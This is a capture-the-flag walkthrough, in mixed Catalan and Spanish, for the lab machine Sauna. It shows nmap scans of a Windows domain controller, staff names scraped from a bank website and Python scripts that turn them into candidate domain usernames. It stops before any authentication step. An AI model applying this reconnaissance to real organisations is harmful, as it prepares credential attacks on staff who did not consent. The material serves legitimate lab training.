Discovered open port 464/tcp on 10.129.95.180
Discovered open port 49673/tcp on 10.129.95.180
Completed SYN Stealth Scan at 12:55, 26.35s elapsed (65535 total ports)
Nmap scan report for 10.129.95.180
Host is up, received user-set (0.047s latency).
Scanned at 2026-04-23 12:55:09 CEST for 26s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  Kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  LDAP             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49688/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131063 (5.767MB) | Rcvd: 33 (1.452KB)
[*] Extrayendo puertos abiertos
[*] Puertos abiertos detectados: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49688,49696
[*] Lanzando escaneo de servicios
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-23 12:55 CEST
Nmap scan report for 10.129.95.180
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  Kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-23 17:55:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  LDAP          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  LDAP          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-04-23T17:56:35
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.43 seconds
[*] Resumen inicial generado en: /home/r4mon/pentest/targets/HTB/easy/SAUNA/notes/00_resumen_inicial.md
[*] Siguiente paso generado en: /home/r4mon/pentest/targets/HTB/easy/SAUNA/notes/01_siguiente_paso.txt
[*] Flujo inicial completado

## objective

Tancar correctament la fase 1 de Sauna a partir de la enumeració observada i fijar una branca principal de trabajo junto amb un següent pas únic, breve i amb valor didàctic.

## Fets verificats

El reconocimiento inicial deixa senyals molt fortes de que el objective se comporta com un controlador de domini Windows. Apareixen DNS, Kerberos, LDAP, SMB, Global Catalog, WinRM i ADWS, a més de diversos puertos RPC altos. Nmap identifical host com `SAUNA`, el domini com `EGOTISTICAL-BANK.LOCAL`, IIS 10.0 en 80/tcp i WinRM en 5985/tcp. També se observa que SMB signing està habilitado i requerido.

La web exposada en 80/tcp no parece una página genérica sense context. Responde amb el título `Egotistical Bank :: Home`, el que que conecta la identitat del domini amb una web corporativa visible. Aquesta relació és rellevant perquè une la superfície de Active Directory amb una posible exposición de noms, estructura interna o context organizativo des de contenido públic.

## assumptions

La inferència principal és que la superfície dominant no és una web vulnerable en sentido clàssic, sinó un entorn Active Directory apoyado per informació pública exposada en la web. En aquest punt, la web parece més una font de identitats que un objective directo de explotació.

Existeix una hipótesis de trabajo raonable según la cual una página informativa del sitio podria mostrar noms completos de empleats, i esos noms podrien servir per derivar usuaris candidats del domini abans de validar Kerberos.

També queda com hipótesis secundària que LDAP anónimo i SMB anónimo poden comprobarse, però sense esperar necesariamente que se conviertan en la via dominant del cas.

Sigue pendent de verificar si el `clock skew` cercano a siete horas afectará més adelante a pruebas relacionadas amb Kerberos. De momento no invalida la metodología, però convé dejarlo anotado des del inicio.

## method

La fase 1 se cierra usant únicamente la evidència observada en la enumeració: sistema probable, rol del host, serveis, domini i superfície dominant.

A partir de ahí, se prioriza una Verificació de baix soroll i alt valor abans de passar a técnicas més sensibles. No se avanza encara hacia abús Kerberos ni accés remot perquè abans convé confirmar si la web aporta noms reals reutilizables com base per una enumeració de identitats més precisa.

## answer

La fase 1 pot darse per suficientment tancada.

El troballa dominant ja no és simplemente que haya muchos puertos abiertos, sinó alguna cosa més concret: el objective presenta una huella molt consistente amb un controlador de domini Windows i, a més, expone una web corporativa asociada al mateix context organizativo. Aquesta combinación oriental cas hacia identitat, permisos i enumeració de Active Directory, no hacia una explotació web sorollosa des del primer momento.

Per aquest motivo, la branca principal activa no debería ser WEB-BASE en sentido clàssic, ni tampoco SMB o WinRM per ara. La branca principal més coherente en aquest momento és **AD_ENUM apoyada per intel·ligència pública des de la web**. Kerberos, LDAP, Global Catalog i WinRM indican que el valor del cas probablemente estará en comptes, autenticación i permisos. La web del banco, per su part, ofrece una via raonable per localizar noms reals i convertirlos després en candidats de usuari del domini.

Les branques secundàries sí merecen quedar anotadas. LDAP anónimo i SMB anónimo son checks razonables, però no dominan aún el cas. WinRM queda registrado només com via de validación posterior si apareixen credencials reals. També convé anotar el desfasament horari com observació operativa important per fases posteriores relacionadas amb Kerberos.

El següent pas únic més net és inspeccionar `about.html` i confirmar si expone noms completos reutilizables per derivar usuaris del domini. Se propone aquest pas perquè part de una senyal prèvia concreta, té un coste mínimo, genera molt poc soroll i, si da resultat, permet construir la següent decisió sobre una base real en lugar de assumptions.

**Quina troballa domina ara:** controlador de domini Windows amb web corporativa útil per intel·ligència de identitats.
**Quina branca principal continua activa:** AD_ENUM apoyada per web pública.
**Quines branques secundàries queden anotades:** LDAP anónimo, SMB anónimo, WinRM només per validación posterior amb credencials i anotación de `clock skew` per futuras pruebas Kerberos.
**Quin és el següent pas únic:** inspeccionar `about.html` i confirmar si expone noms completos reutilizables per derivar usuaris del domini.

## commands

```bash
curl -s http://10.129.95.180/about.html -o about.html
grep -Eoi '[A-Z][a-z]+ [A-Z][a-z]+' about.html | sort -u
```

El primer ordre se propone per validar una hipótesis molt concreta amb el mínimo soroll: comprovar si la web pública expone noms de empleats. No se executa per curiosidad, sinó per buscar materia prima útil per identitat en Active Directory.

El segundo no explota nada. Només filtra posibles noms completos del HTML per convertir una observació visual en una llista reutilitzable. El que important no és la cantidad de coincidencias, sinó si apareixen noms plausibles i completos que permitan sostener el següent pas amb base real.

## checks

Si `about.html` retorna noms completos, el resultat pasará de hipótesis a Fet verificat i ja existirá una base raonable per generar convencions de usuari i passar a validación Kerberos.

Si `about.html` no contiene noms o retorna alguna cosa irrelevante, no convendrá saltar encara a técnicas més agresivas. La reevaluación lógica será revisar de forma ligera otras páginas visibles de la web i, en paralelo, fer una comprobación breve de LDAP/SMB anónimos com branques secundàries.

El `clock skew` ha de quedar anotado des de ja, perquè tot i que encara no se esté en fase de abús Kerberos, aquest dato pot explicar fallos posteriores i evitar diagnósticos equivocados.

## writeup_notes

La enumeració inicial de Sauna no només revela un objective Windows, sinó que perfila amb bastante claridad a un controlador de domini. La presencia simultánea de Kerberos, LDAP, Global Catalog, WinRM i serveis RPC, unida a una web corporativa coherente amb el domini detectado, orienta la investigación hacia una cadena de Active Directory basada en identitats reals i no hacia una explotació web directa.

Lliçó reutilitzable: quan una màquina de Active Directory expone una web corporativa aparentment inocente, aquesta web pot no ser una puerta de entrada tècnica, però sí una font decisiva de noms reals, estructura organizativa i context. En muchos casos, el primer pas útil no és romper nada, sinó llegir correctament el que que la pròpia organización ha publicado.

❯ curl -s http://10.129.95.180/about.html -o about.html
grep -Eoi '[A-Z][a-z]+ [A-Z][a-z]+' about.html | sort -u
about py
About Us
aliquam leo
aliquet leo
All Rights
amet eros
amet leo
amet mattis
amet pretium
Android Compatible
Apply Now
augue ac
Author URL
Auto Loan
auto text
bank account
banner bottom
bar bg
bar progress
between align
Bootstrap Web
bottom py
Bowie Taylor
brand pt
btn btn
btn mr
btn read
Business Loan
Business Reach
button type
center mt
center my
center py
Check Your
Choose Your
consectetur adipiscing
contact my
Contact Us
container contact
container py
content py
content text
Creative Commons
Credit Cards
cursus rhoncus
Customer Care
Daily Expenses
Debit Card
default read
Design by
div class
div id
DOCTYPE html
dolor efficitur
dolor sit
Donec malesuada
Drop Down
dui turpis
Duis nisi
Education Loan
Egotistical Bank
elementum finibus
erat sit
ex sit
fa clr
fa fa
felis dapibus
Fergus Smith
fermentum eget
Financial Services
Find us
finibus lorem
finibus sed
First Tier
Fixed Deposit
Flat Web
flex justify
fluid image
footer bottom
footer class
footer text
for Nokia
form method
form mx
free webdesigns
function hideURLbar
Fusce semper
gd mt
Get Your
grid mt
grid test
grids row
grids text
Health Loan
Helping Your
Home Loan
html lang
Hugo Bear
img mt
img src
in convallis
inf pl
info list
info text
inner py
input type
Integer sit
Integer ultrices
ipsum sit
Its Full
label for
Latest Posts
left mb
left pl
left text
li class
li mt
libero aliquam
License URL
link href
link rel
Loan Management
Lorem ipsum
ls mb
ls mt
ls my
ls two
luctus massa
malesuada sedint
managers but
massa eu
Mauris hendrerit
Meet the
Meet The
meta charset
meta name
Meta tag
Motorola web
nsequursu dsdesdc
Nulla congue
Nullam dui
of Banking
one mt
Onec consequat
Online Marketing
only one
Our Mission
Our Skills
Our Team
per col
Personal Banking
Personal Loan
Phasellus sed
Praesent ullamcorper
pretium metus
Previous Record
Privacy Policy
products py
pvt ml
pvt py
pvt serve
Quisque vitae
re Provided
Read More
recycle mr
Repay Responsive
Repayable in
right col
right ml
right mt
right text
row bottom
row footer
row products
row subscribe
sapien ut
Savings Account
scelerisque tellus
sec page
section class
security manager
services about
Services we
Shaun Coins
sid ornare
Simple Websites
Single Page
sit amet
Small Business
Smartphone Compatible
So many
Social Media
Sophie Driver
Sounds about
span class
Steven Kerb
Suspendisse porta
Suspendisse venenatis
toggle toogle
top text
ul class
ultricies velit
unstyled mt
utpretium nulla
vel ex
web template
welcome py
What We
wide range
xxx Honey
Your Email

## objective

Analitzar la sortida obtenida de `about.html`, separar senyal útil de soroll i decidir el següent pas únic amb base en evidència real.

## Fets verificats

La página `about.html` existeix, responde i contiene texto suficient com per extraer contenido semiestructurado.

La expresión regular utilizada ha devuelto molt soroll, però dentro de la sortida apareixen diversos noms propis amb formato clarament plausible de persones:

* Fergus Smith
* Bowie Taylor
* Hugo Bear
* Shaun Coins
* Sophie Driver
* Steven Kerb

Això convierte en **Fet verificat** que la web pública expone noms completos reutilizables com base per una branca de identitat.

També queda verificat que el filtro usado és massa ampli per aquest cas, perquè mezcla noms reals amb gran cantidad de texto decorativo, clases CSS, frases de plantilla i cadenas sense valor operatiu.

## assumptions

La inferència principal és que esos noms pertenecen a empleats o perfils corporativos mostrados en la web i que, per tanto, son buenos candidats per derivar convencions de usuari del domini.

La inferència secundària és que la página probablemente contiene una sección tipo “team” o similar, i que extraer els noms de forma més neta mejorará la trazabilidad del cas i reducirá errores en la següent fase.

Encara està pendent de verificar què convenció de noms usa realment el domini per les comptes: nom simple, inicial+apellido, nom.apellido u otra variante.

## method

Primer se separa la evidència útil del soroll generado per una expresión regular massa genérica.

Després se conserva únicamente la part amb valor per Active Directory: els noms completos plausibles.

Amb aquesta base, el següent pas no ha de ser encara forzar serveis ni obrir diverses branques a la vez, sinó construir una llista neta de identitats candidatas per poder passar després a validaciones controladas sobre naming convention.

## answer

La prueba ha salido bien i, a més, ha servido per alguna cosa important: ja no se trabaja sobre una intuición, sinó sobre una evidència concreta. La web pública expone diversos noms completos que encajan perfectamente amb una futura fase de enumeració de identitats en Active Directory.

El resultat útil no és toda la sortida del `grep`, perquè casi todo això és basura de plantilla HTML. El que valioso de verdad son els seis noms que destacan clarament com persones reals:

* Fergus Smith
* Bowie Taylor
* Hugo Bear
* Shaun Coins
* Sophie Driver
* Steven Kerb

Aquest hallazgo cambia la situación. La web deixa de ser una superfície meramente informativa i passa a ser una font real de intel·ligència de identitats. Això refuerza que la branca principal siga siendo **AD enum apoyada per informació pública**.

Ara mateix no interessa saltar encara a LDAP, SMB o WinRM com vies principales. Tampoco interessa encadenar diverses checks a la vez. El que més net és consolidar primer una llista de noms reals bien curada i, a partir de ahí, derivar convencions de usuari plausibles.

**Quina troballa domina ara:** la web pública expone noms completos útils per derivar identitats del domini.

**Quina branca principal continua activa:** AD enum apoyada per intel·ligència pública des de la web.

**Quines branques secundàries queden anotades:** LDAP anónimo, SMB anónimo, WinRM per validación posterior si apareixen credencials, i observació del `clock skew` per fases posteriores relacionadas amb Kerberos.

**Quin és el següent pas únic:** guardar una llista neta de noms reals i dejarla preparada per generar usuaris candidats.

## commands

```bash id="5n0mrq"
printf '%s\n' \
'Fergus Smith' \
'Bowie Taylor' \
'Hugo Bear' \
'Shaun Coins' \
'Sophie Driver' \
'Steven Kerb' > fullnames.txt

cat fullnames.txt
```

El motivo de aquest pas és molt concret: abans de derivar usuaris candidats convé fijar una base neta i libre de soroll. La senyal prèvia que lleva a hacerlo és que el `grep` ja va confirmar noms reals, però mezclados amb demasiadas coincidencias irrelevantes.

El primer ordre no explota nada ni tocal objective. Només convierte la observació útil en un artefacto de trabajo net. El segundo sirve per verificar que la llista va quedar bien guardada i sense errores de transcripción.

El que que interessa de verdad en la sortida és confirmar que la llista contiene únicamente noms plausibles i completos. Si apareix soroll, la següent fase se contamina; si la llista està neta, la derivació de usuaris tendrá mucha més calidad.

## checks

Comprovar que `fullnames.txt` contenga només els noms reals i no cadenas decorativas del HTML.

Verificar que no haya duplicados ni errores obvios de copia.

Dejar anotado que, a partir de aquest punt, el que següent ja no será “buscar noms”, sinó “evaluar què convenció de comptes podria usar el domini amb esos noms”.

## writeup_notes

La revisión de `about.html` va permetre transformar una web aparentment corporativa en una font práctica de intel·ligència per Active Directory. Tot i que la extracción inicial va retornar molt soroll per el patrón usado, entre aquest soroll aparecieron diversos noms completos plausibles de empleats, suficientes per justificar una branca centrada en derivació de identitats.

Lliçó reutilitzable: en entornos Windows amb senyals de domini, una web pública pot aportar molt valor incluso sense vulnerabilitats visibles. El objective inicial no siempre és encontrar una falla tècnica, sinó reunir noms reals que després permitan construir una enumeració de identitats molt més precisa.

❯ printf '%s\n' \
'Fergus Smith' \
'Bowie Taylor' \
'Hugo Bear' \
'Shaun Coins' \
'Sophie Driver' \
'Steven Kerb' > fullnames.txt

cat fullnames.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: fullnames.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Fergus Smith
   2   │ Bowie Taylor
   3   │ Hugo Bear
   4   │ Shaun Coins
   5   │ Sophie Driver
   6   │ Steven Kerb
───────┴

objective

Registrar correctament el artefacto de trabajo generado i dejar preparado el següent pas de la branca de identitats en Sauna.

verified_facts

El fitxer `fullnames.txt` ha quedado creado correctament i contiene seis noms completos plausibles:

* Fergus Smith
* Bowie Taylor
* Hugo Bear
* Shaun Coins
* Sophie Driver
* Steven Kerb

La ubicación real del fitxer ja està verificada:

`/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users/fullnames.txt`

La llista està neta, sense soroll HTML, sense duplicados visibles i amb formato adecuado per reutilizarla en la següent fase.

assumptions

La inferència principal és que aquesta llista ja pot considerarse una base operativa válida per derivar convencions de nom de usuari del domini.

També és raonable asumir que el següent pas útil no és seguir buscando més noms, sinó transformar aquests noms completos en candidats de compte amb patrones habituales de Active Directory.

method

Primer se consolida la evidència útil en un fitxer net i bien ubicado dentro de `content/users`, que és una ruta coherente per artefactos operativos relacionados amb identitats.

Després, en lugar de obrir diverses branques a la vez, se manté una sola línea de trabajo: passar de noms completos a posibles noms de usuari.

answer

Perfecto. Así està bien guardado.

La ubicación és bona i té lógica operativa:

`/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users/fullnames.txt`

Això deixa la fase actual bien tancada: la web ja ha aportado una llista de identitats plausibles i aquesta evidència ja està convertida en un artefacto net reutilitzable.

Quina troballa domina ara: la web pública ja ha producido noms completos útils per derivar identitats del domini.

Quina branca principal continua activa: AD enum apoyada per intel·ligència pública des de la web.

Quines branques secundàries queden anotades: LDAP anónimo, SMB anónimo, WinRM per validación posterior si apareixen credencials, i observació del clock skew per futuras pruebas Kerberos.

Quin és el següent pas únic: generar, a partir de `fullnames.txt`, una llista de noms de usuari candidats amb convencions típicas de domini.

commands

```bash id="4w1hvk"
cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users
```

Aquest pas no busca descubrir nada nuevo, sinó fijar el context correcte de trabajo abans de generar els candidats de usuari des del fitxer ja validat.

checks

Comprovar que futuras sortides derivadas de aquest fitxer se guarden també en `content/users` per mantenir juntas les evidències de identitat.

Mantenir `fullnames.txt` com font base i no sobrescribirlo, per conservar trazabilidad entre noms reals observats i noms de usuari derivados.

writeup_notes

La revisión de la web pública va permetre obtenir una llista neta de noms completos i convertir una observació visual en un artefacto operatiu reutilitzable. A partir de aquest momento, la investigación deixa de depender de intuiciones i passa a apoyarse en identitats concretes extraídas del entorn objective.


## objective

Passar de noms reals observats en la web a una llista neta de noms de usuari candidats, sense tocar encara serveis de autenticación ni obrir branques paralelas.

## Fets verificats

El fitxer base ja existeix i està bien ubicado en:

`/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users/fullnames.txt`

Aquest fitxer contiene seis noms completos plausibles i útils per trabajar la branca de identitats.

El operador ja està situado en el directorio correcte de trabajo:

`/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users`

## assumptions

La hipótesis de trabajo més raonable és que el domini use una convenció típica de Active Directory per les comptes de usuari, per ejemplo:

* nom
* apellido
* nom.apellido
* inicial+apellido
* nom+inicial apellido

Encara no està verificat cuál de esas convencions usa realment el domini. Per això, el següent pas correcte no és probar autenticación aún, sinó generar primer una llista ordenada de candidats.

## method

Se manté `fullnames.txt` com font neta i se genera un segundo fitxer derivado amb posibles noms de usuari.

Se evita introducir eines innecesarias en aquest punt. La derivació se fa de forma local, reproducible i amb poc soroll, per que la següent fase parta de un artefacto clar i revisable.

## answer

El següent pas únic correcte és generar una llista de usuaris candidats a partir de `fullnames.txt`.

La razón és simple: ja existeix evidència suficient de noms reals, però encara no existeix evidència de la convenció de comptes usada per el domini. Abans de validar nada contra Kerberos o LDAP, convé construir una llista raonable de candidats i dejarla guardada com artefacto operatiu.

Quina troballa domina ara: la web pública ja ha proporcionado identitats plausibles.

Quina branca principal continua activa: AD enum apoyada per intel·ligència pública des de la web.

Quines branques secundàries queden anotades: LDAP anónimo, SMB anónimo, WinRM per una fase posterior si apareixen credencials, i observació del clock skew per futuras validaciones amb Kerberos.

Quin és el següent pas únic: generar `usernames.txt` a partir de `fullnames.txt`.

## commands

```bash id="kz03np"
python3 - <<'PY'
from pathlib import Path

src = Path("fullnames.txt")
dst = Path("usernames.txt")

seen = set()
order = []

for line in src.read_text(encoding="utf-8").splitlines():
    name = line.strip()
    if not name:
        continue
    parts = name.lower().split()
    if len(parts) < 2:
        continue

    first = parts[0]
    last = parts[-1]

    candidates = [
        first,
        last,
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}_{last}",
        f"{first[0]}{last}",
        f"{first}{last[0]}",
        f"{first[0]}.{last}",
        f"{last}.{first}",
        f"{last}{first[0]}",
    ]

    for candidate in candidates:
        if candidate not in seen:
            seen.add(candidate)
            order.append(candidate)

dst.write_text("\n".join(order) + "\n", encoding="utf-8")
print(f"[+] Guardados {len(order)} candidats en {dst}")
PY

head -n 30 usernames.txt
```

Aquest bloc se propone perquè la senyal prèvia ja existeix: hi ha noms reals i limpios. El que que falta no és més recol·lecció, sinó transformar aquesta evidència en usuaris candidats amb patrones habituales.

Què fa: lee `fullnames.txt`, genera diverses convencions comunes de compte, elimina duplicados i guardal resultat en `usernames.txt`.

Què se espera obtenir: una llista compacta i reutilitzable de noms de usuari plausibles, llista per la següent fase.

Quina part de la sortida interessa realment: confirmar que apareixen patrones lógicos com `fsmith`, `fergus.smith`, `fergussmith`, `sdriver`, `skerb`, etc., i que el fitxer se crea sense soroll.

Com canvia la decisió següent: si la llista queda bien, la següent fase ja podrá centrarse en una validación controlada de naming convention o de exposición Kerberos, en lugar de seguir inventando usuaris a mano.

## checks

Comprovar que `usernames.txt` se haya creado en el directorio actual.

Revisar visualmente les primeras líneas per confirmar que no apareixen espacios, mayúsculas extrañas ni cadenas vacías.

Mantenir `fullnames.txt` intacto com font original i usar `usernames.txt` com artefacto derivado per la següent fase.

## writeup_notes

Una vez obtinguts noms reals des de la web pública, el pas metodológicamente correcte no és probar accés de inmediato, sinó convertir aquesta evidència en una llista estructurada de posibles comptes. Això permet que la següent validación sobre Kerberos o serveis de directorio parta de identitats plausibles i no de assumptions improvisadas.

Lliçó reutilitzable: en entornos Active Directory, una llista neta de noms completos només és el principio. El valor real apareix quan se traduce aquesta informació pública a convencions de compte probables i se documenta aquesta transición amb trazabilidad.

## Executem el bloc i revisem la sortida

head -n 30 usernames.txt
[+] Guardados 60 candidats en usernames.txt
fergus
smith
fergus.smith
fergussmith
fergus_smith
fsmith
ferguss
f.smith
smith.fergus
smithf
bowie
taylor
bowie.taylor
bowietaylor
bowie_taylor
btaylor
bowiet
b.taylor
taylor.bowie
taylorb
hugo
bear
hugo.bear
hugobear
hugo_bear
hbear
hugob
h.bear
bear.hugo
bearh

## objective

Analitzar la calidad de `usernames.txt`, separar candidats plausibles de candidats ruidosos i preparar una llista prioritzada per la següent validación de identitats.

## Fets verificats

El fitxer `usernames.txt` se ha generado correctament i contiene **60 candidats** derivados de els seis noms completos.

La sortida confirma que la derivació funciona i que incluye patrones típicos de compte de domini, entre ellos:

* `fsmith`
* `fergus.smith`
* `fergussmith`
* `btaylor`
* `hbear`

També se ve que el fitxer mezcla patrones molt plausibles amb otros bastante flojos o de poc valor operatiu, per ejemplo:

* `ferguss`
* `bowiet`
* `hugob`

Això significa que la generación ha sido útil, però encara no convé tratar els 60 candidats com igual de buenos.

## assumptions

La suposició més raonable és que el domini probablemente use una convenció corporativa relativamente simple i repetible, no una combinación arbitraria de todas les variantes posibles.

En un entorn así, els patrones que normalmente merecen més atención inicial son:

* `nombre.apellido`
* `inicialapellido`
* `nombreapellido`
* `nombre_apellido`

Els candidats formados com `nombre + inicial del apellido` o variantes invertidas suelen tenir menys valor inicial i meten més soroll del necesario.

## method

Primer se valida que el artefacto derivado se haya creado bien.

Després se reduce el conjunto a una **llista prioritzada**, més curta i més coherente amb convencions corporativas habituales.

La idea no és tirar informació, sinó separar una primera tanda de candidats fortes per que la següent validación sea més neta i tenga millor trazabilidad.

## answer

La sortida és bona, però encara no és la llista amb la que convé avanzar directament.

El que important no és que haya 60 candidats, sinó que entre ellos ja apareixen diverses convencions molt sólidas. Això confirma que la transición de noms reals a comptes plausibles se ha fet bien. El problema és que la llista mezcla senyal amb massa relleno.

Ara mateix no interessa seguir ampliando el número de variantes. Interessa fer el que contrario: **priorizar**.

La decisió correcta en aquest punt és preparar una llista reducida amb les convencions que tenen més sentido en un domini corporatiu. Así se evita soroll innecesario i se deixa la següent validación molt més neta.

**Quina troballa domina ara:** ja existeixen candidats de usuari plausibles derivados de noms reals observats.

**Quina branca principal continua activa:** AD enum apoyada per intel·ligència pública des de la web.

**Quines branques secundàries queden anotades:** LDAP anónimo, SMB anónimo, WinRM per una fase posterior si apareixen credencials i observació del `clock skew` per futuras validaciones relacionadas amb Kerberos.

**Quin és el següent pas únic:** generar una llista prioritzada de candidats de usuari amb els patrones més plausibles.

## commands

```bash
python3 - <<'PY'
from pathlib import Path

src = Path("fullnames.txt")
dst = Path("usernames_priority.txt")

seen = set()
order = []

for line in src.read_text(encoding="utf-8").splitlines():
    name = line.strip()
    if not name:
        continue
    parts = name.lower().split()
    if len(parts) < 2:
        continue

    first = parts[0]
    last = parts[-1]

    candidates = [
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}_{last}",
        f"{first[0]}{last}",
    ]

    for candidate in candidates:
        if candidate not in seen:
            seen.add(candidate)
            order.append(candidate)

dst.write_text("\n".join(order) + "\n", encoding="utf-8")
print(f"[+] Guardados {len(order)} candidatos prioritarios en {dst}")
PY

cat usernames_priority.txt
```

Se propone aquest pas perquè la senyal prèvia ja existeix: hi ha noms reals i ja se va generar una llista àmplia de usuaris candidats. El que que falta ara és **ordenar la calidad** de aquesta informació abans de seguir.

Què fa: toma `fullnames.txt`, genera només els formatos més plausibles i els guarda en `usernames_priority.txt`.

Què se espera obtenir: una llista més petita, més neta i més realista per una primera validación de identitats.

Quina part de la sortida interessa realment: confirmar que aparezcan candidats com:

* `fergus.smith`
* `fergussmith`
* `fergus_smith`
* `fsmith`

i sus equivalentes per els demás noms.

Com canvia la decisió següent: si aquesta llista queda bien, el següent pas ja podrá centrarse en una validación controlada de usuaris candidats, en lugar de seguir trabajando amb una llista massa sorollosa.

## checks

Comprovar que `usernames_priority.txt` se crea en el directorio actual.

Verificar visualmente que la llista és més curta i que ja no apareixen variantes flojas com `ferguss`, `bowiet` o `hugob`.

Comprovar que cada nom base aporta cuatro variantes i que no se han perdido candidats fortes com `fsmith` o `sdriver`.

Mantenir `usernames.txt` com llista àmplia i `usernames_priority.txt` com llista de trabajo prioritzada.

## writeup_notes

La derivació inicial de usuaris candidats cumplió su función: transformar noms reals en posibles comptes del domini. Sense embargo, no todas les variantes generadas tenen el mateix valor. El pas metodológicamente correcte no és probar todo sense filtrar, sinó separar primer les convencions més plausibles per reducir soroll i mejorar la calidad de la validación posterior.

Lliçó reutilitzable: en Active Directory, generar muchas variantes no siempre mejora la enumeració. A menudo, una llista més petita però millor prioritzada da mejores resultats i deixa una trazabilidad molt més clara.

## Executem el bloc i revisem la sortida

cat usernames_priority.txt
[+] Guardados 24 candidats prioritarios en usernames_priority.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: usernames_priority.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ fergus.smith
   2   │ fergussmith
   3   │ fergus_smith
   4   │ fsmith
   5   │ bowie.taylor
   6   │ bowietaylor
   7   │ bowie_taylor
   8   │ btaylor
   9   │ hugo.bear
  10   │ hugobear
  11   │ hugo_bear
  12   │ hbear
  13   │ shaun.coins
  14   │ shauncoins
  15   │ shaun_coins
  16   │ scoins
  17   │ sophie.driver
  18   │ sophiedriver
  19   │ sophie_driver
  20   │ sdriver
  21   │ steven.kerb
  22   │ stevenkerb
  23   │ steven_kerb
  24   │ skerb

## objective

Determinar el següent pas correcte a partir de la llista prioritzada de usuaris candidats, minimizando soroll i evitando validaciones Kerberos engañosas per un posible problema de desfasament horari.

## Fets verificats

El fitxer `usernames_priority.txt` se ha generado correctament i contiene 24 candidats priorizados, amb cuatro variantes per cada nom completo observat en la web.

La llista té bona calidad operativa. Incluye patrones molt plausibles per un entorn Active Directory corporatiu, com:

* `fsmith`
* `btaylor`
* `hbear`
* `scoins`
* `sdriver`
* `skerb`

i també variantes razonables com:

* `fergus.smith`
* `bowie.taylor`
* `hugo.bear`
* `shaun.coins`
* `sophie.driver`
* `steven.kerb`

La fase de derivació de identitats pot considerarse tancada: ja existeix una llista curta, neta i prioritzada per passar a validación.

També sigue vigente una observació important de la fase inicial: hi ha indicios de un `clock skew` notable entre el entorn atacant i el controlador de domini.

## assumptions

La suposició principal és que una de les convencions incluidas en `usernames_priority.txt` coincide amb el patrón real de comptes del domini.

La segunda suposició, més important per el següent pas, és que cualquier validación basada en Kerberos pot fallar o producir resultats confusos si el desfasament horari no se comprueba abans.

Per tanto, tot i que la llista de usuaris ja està llista, encara no convé usarla directament contra Kerberos sense atender abans aquest posible problema de temps.

## method

Primer se consolida que la llista prioritzada ja està suficientment bien construïda i no necesita mes variantes.

Després se evita un error metodològic molt común en entornos AD: lanzar validaciones Kerberos sense comprovar abans la sincronització temporal.

El següent pas únic no será encara validar usuaris, sinó comprovar i, si fa falta, corregir el desfasament horari del entorn atacant respecto al objective. Això preparal terreno per que la següent validación de identitats sea fiable.

## answer

